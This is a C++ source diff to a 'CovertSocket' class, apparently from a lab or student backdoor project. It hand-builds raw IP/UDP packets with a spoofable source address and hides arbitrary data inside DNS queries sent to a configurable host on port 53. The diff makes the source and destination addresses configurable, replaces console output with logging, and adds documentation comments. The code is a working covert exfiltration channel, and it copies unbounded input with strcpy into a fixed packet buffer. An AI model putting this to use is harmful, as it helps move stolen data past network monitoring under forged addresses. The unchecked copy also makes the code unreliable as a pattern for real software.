@@ -6,6 +6,7 @@
 #include <cstring>
 #include "CovertSocket.h"
 #include "../utils/Structures.h"
+#include "../utils/Logger.h"
 
 #include <sys/types.h>
 #include <unistd.h>
@@ -14,8 +15,15 @@
 #include <netinet/udp.h>
 #include <iostream>
 
+/**
+ * instance holds instance for the covert socket singleton
+ */
 CovertSocket * CovertSocket::instance = nullptr;
 
+/**
+ * static method that generates an instance of a CovertSocket. this is enforced as a singleton
+ * @return CovertSocket - a new covert socket instance if one doesn't already exist or the same one otherwise
+ */
 CovertSocket * CovertSocket::getInstance() {
     if(CovertSocket::instance == nullptr){
         CovertSocket::instance = new CovertSocket();
@@ -24,6 +32,28 @@ CovertSocket * CovertSocket::getInstance() {
     return CovertSocket::instance;
 }
 
+/**
+ * setDestinationAddress is a configuration route that sets the destination address for the covert socket
+ * @param destinationAddress String - the destination IP address being set
+ */
+void CovertSocket::setDestinationAddress(string destinationAddress) {
+    this->destinationAddress = destinationAddress;
+}
+
+/**
+ * setSourceAddress is a configuration route that sets the source address for the covert socket
+ * @param sourceAddress String - the source IP address being set
+ */
+void CovertSocket::setSourceAddress(string sourceAddress) {
+    this->sourceAddress = sourceAddress;
+}
+
+/**
+ * the constructor for the CovertSocket. When a new instance is made by the singleton. This constructor is called and
+ * initializes required components of the object. The constructor is set to private visibility so that no extra
+ * instances are created
+ * @return
+ */
 CovertSocket::CovertSocket() {
 
     //constructor
@@ -35,13 +65,28 @@ CovertSocket::CovertSocket() {
         perror("setsockopt");
     }
 
+    //IP_HDRINCL to stop the kernel from building the packet headers
+    {
+        int one = 1;
+        const int *val = &one;
+        if (setsockopt(this->rawSocket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
+            perror("setsockopt");
+    }
+
+
 }
 
+/**
+ * send sends the passed in data out using the configurged desitnation and source addresses.The CovertSocket generates
+ * a DNS packet and then fills it with the data needing to be sent. This method does not completely follow DNS as there
+ * is a max count of 63 bytes. This method will simply append the data regardless of its length
+ * @param data String - the data being sent
+ */
 void CovertSocket::send(string data) {
 
-    cout << "DATA To BE SENT IS: >" << data << "<" << endl;
-    cout << "DATA LENGTH: >" << data.length() << "<" << endl;
-    cout << "DATA SIZE: >" << sizeof(strlen(data.c_str()) * sizeof(char)) << "<" << endl;
+    Logger::debug("Data To Be Sent Is: >" + data + "<");
+    Logger::debug("Data Length: >" + to_string(data.length()) + "<");
+    Logger::debug("Data Size: >" + to_string(data.size()) + "<");
 
     char datagram[PKT_SIZE];
     struct iphdr *ip = (struct iphdr *) datagram;
@@ -55,7 +100,7 @@ void CovertSocket::send(string data) {
 
     sin.sin_family = AF_INET;
     sin.sin_port = htons(53);
-    sin.sin_addr.s_addr = inet_addr("127.0.0.1");
+    sin.sin_addr.s_addr = inet_addr(this->destinationAddress.c_str());
 
     memset(datagram, 0, PKT_SIZE);
 
@@ -69,7 +114,7 @@ void CovertSocket::send(string data) {
     ip->ttl = 255;        // Set the TTL value
     ip->protocol = IPPROTO_UDP;
     ip->check = 0;        //Initialize to zero before calculating checksum
-    ip->saddr = inet_addr ("127.0.0.1");  //Source IP address
+    ip->saddr = inet_addr (this->sourceAddress.c_str());  //Source IP address
     ip->daddr = sin.sin_addr.s_addr;
 
     ip->check = this->csum((unsigned short *) datagram, ip->tot_len >> 1);
@@ -79,9 +124,9 @@ void CovertSocket::send(string data) {
     //udp->source
     udp->source = htons(4378);
 
-    printf("UDP Size: %d ", sizeof(*udp) + data.size());
-    printf("UDP Header: %d ", sizeof(*udp));
-    printf("UDP Payload: %d\n", data.size());
+    Logger::debug("UDP Size: " + to_string(sizeof(*udp) + data.size()));
+    Logger::debug("UDP Header: " + to_string(sizeof(*udp)));
+    Logger::debug("UDP Payload: " + to_string(data.size()));
 
     //udp->len = htons(sizeof(*udp) + data.size());
     //udp->uh_sum = htons(sizeof(*udp) + data.size());
@@ -91,7 +136,7 @@ void CovertSocket::send(string data) {
 
     //Pseudo Header
     psh.dest_address = sin.sin_addr.s_addr;
-    psh.source_address = inet_addr("127.0.0.1");
+    psh.source_address = inet_addr(this->sourceAddress.c_str());
     psh.placeholder = 0;
     psh.protocol = IPPROTO_UDP;
 
@@ -116,26 +161,12 @@ void CovertSocket::send(string data) {
     dns->add_count = 0;
 
     strcpy(query, data.c_str());
-
-    //char * writable = new char[data.size() + 1];
-    //std::copy(data.begin(), data.end(), writable);
-    //writable[data.size()] = '\0'; // don't forget the terminating 0
-
     //ChangetoDnsNameFormat(query, writable);
 
     struct QUESTION *dnsq = (struct QUESTION *)(datagram + sizeof(*ip) + sizeof(*udp) + sizeof(*dns) + data.size());
 
     dnsq->qtype = htons(1); // 1 for IPv4 lookup
     dnsq->qclass = htons(1); //1 for internet class
-
-
-    //IP_HDRINCL to stop the kernel from building the packet headers
-    {
-        int one = 1;
-        const int *val = &one;
-        if (setsockopt(this->rawSocket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
-            perror("setsockopt");
-    }
 
     //Send the packet
     if (sendto (this->rawSocket, datagram, ip->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
@@ -145,6 +176,13 @@ void CovertSocket::send(string data) {
 
 }
 
+/**
+ * csum is a helper method that generates the checksum needed for the response packet to be validated and sent
+ * by the network stack
+ * @param ptr
+ * @param nbytes
+ * @return
+ */
 unsigned short CovertSocket::csum (unsigned short *ptr,int nbytes)
 {
     register long sum;
@@ -169,6 +207,12 @@ unsigned short CovertSocket::csum (unsigned short *ptr,int nbytes)
     return(answer);
 }
 
+/**
+ * ChangetoDnsNameFormat is a helper method that changes the passed in dns name into the appropriate format. Due to our
+ * data not being valid DNS data. This method is not used but is available in the event of further improvements
+ * @param dns
+ * @param host
+ */
 void CovertSocket::ChangetoDnsNameFormat(char* dns, char* host)
 {
     int lock = 0 , i;
